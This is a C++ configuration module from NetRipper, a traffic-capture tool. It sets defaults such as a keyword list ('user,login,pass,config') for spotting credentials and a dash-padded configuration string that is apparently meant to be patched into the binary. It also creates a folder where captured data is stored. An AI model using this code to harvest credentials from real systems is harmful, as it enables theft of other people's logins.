
#include "stdafx.h"
#include "DynConfig.h"

// Class data

string DynConfig::s_sDataPath     = "TEMP";
string DynConfig::s_sPlainText    = "false";
string DynConfig::s_sDataLimit    = "65535";
string DynConfig::s_sStringFinder = "user,login,pass,config";

// Default settings

string DynConfig::s_sConfigurationString = 
	"<NetRipper><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>DEFAULT</stringfind"
	"er><data_path>TEMP</data_path></NetRipper>----------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------";

// Read and parse configuration data

void DynConfig::Init()
{
	s_sDataPath     = Utils::GetStringBetween(s_sConfigurationString, "<data_path>", "</data_path>");
	s_sPlainText    = Utils::GetStringBetween(s_sConfigurationString, "<plaintext>", "</plaintext>");
	s_sDataLimit    = Utils::GetStringBetween(s_sConfigurationString, "<datalimit>", "</datalimit>");
	s_sStringFinder = Utils::GetStringBetween(s_sConfigurationString, "<stringfinder>", "</stringfinder>");
}

// Get plaintext plugin config

string DynConfig::GetPlainText()
{
	return s_sPlainText;
}

// Get datalimit plugin config

string DynConfig::GetDataLimit()
{
	return s_sDataLimit;
}

// Get stringfinder plugin config

string DynConfig::GetStringFinder()
{
	return s_sStringFinder;
}

// Get the data path, create folder if it does not exists

string DynConfig::GetDataPath()
{
	char buffer[MAX_TEMP_PATH] = {0};
	string sPath = "";

	// If it is default configured to use TEMP

	if(s_sDataPath.compare("TEMP") == 0)
	{
		// Get Temp path

		if(GetTempPath(MAX_TEMP_PATH, buffer) == 0)
		{
			DebugLog::DebugError("[ERROR] Cannot get temporary path to save data!");
			return "";
		}

		sPath = buffer;
		sPath = sPath + "NetRipper";
	}
	else sPath = s_sDataPath;

	// Create DIRECTORY if does not exist

	if(CreateDirectory(sPath.c_str(), NULL) == 0)
	{
		if(GetLastError() != ERROR_ALREADY_EXISTS)
		{
			DebugLog::DebugError("[ERROR] Cannot create NetRipper directory to save data!");
			return "";
		}
	}

	sPath = sPath + "\\";

	return sPath;
}
